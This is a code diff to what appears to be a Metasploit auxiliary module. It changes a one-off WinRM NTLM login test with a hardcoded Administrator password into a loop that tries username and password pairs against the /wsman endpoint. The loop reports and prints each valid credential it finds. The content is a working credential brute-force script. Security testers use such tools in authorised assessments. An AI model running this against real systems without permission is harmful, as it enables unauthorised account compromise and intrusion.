@@ -49,14 +49,32 @@ class Metasploit3 < Msf::Auxiliary
 
 
 	def run_host(ip)
-		opts = {
-			'uri' => '/wsman',
-			'data' => test_request,
-			'username' => 'Administrator',
-			'password' => 'P@ssw0rd1!'
-		}
-		resp,c = send_request_ntlm(opts)
-		print_status resp.inspect
+		each_user_pass do |user, pass|
+			opts = {
+				'uri' => datastore['URI'],
+				'data' => test_request,
+				'username' => user,
+				'password' => pass
+			}
+			resp,c = send_request_ntlm(opts)
+			if resp.code == 200
+				cred_hash = {
+					:host              => ip,
+					:port              => rport,
+					:sname          => 'winrm',
+					:pass              => pass,
+					:user              => user,
+					:source_type => "user_supplied",
+					:active            => true
+				}
+				report_auth_info(cred_hash)
+				print_good "Valid credential found: #{user}:#{pass}"
+			elsif resp.code == 401
+				print_error "Login failed: #{user}:#{pass}"
+			else
+				print_error "Recieved unexpected Response Code: #{resp.code}"
+			end
+		end
 	end
 
 	def test_request
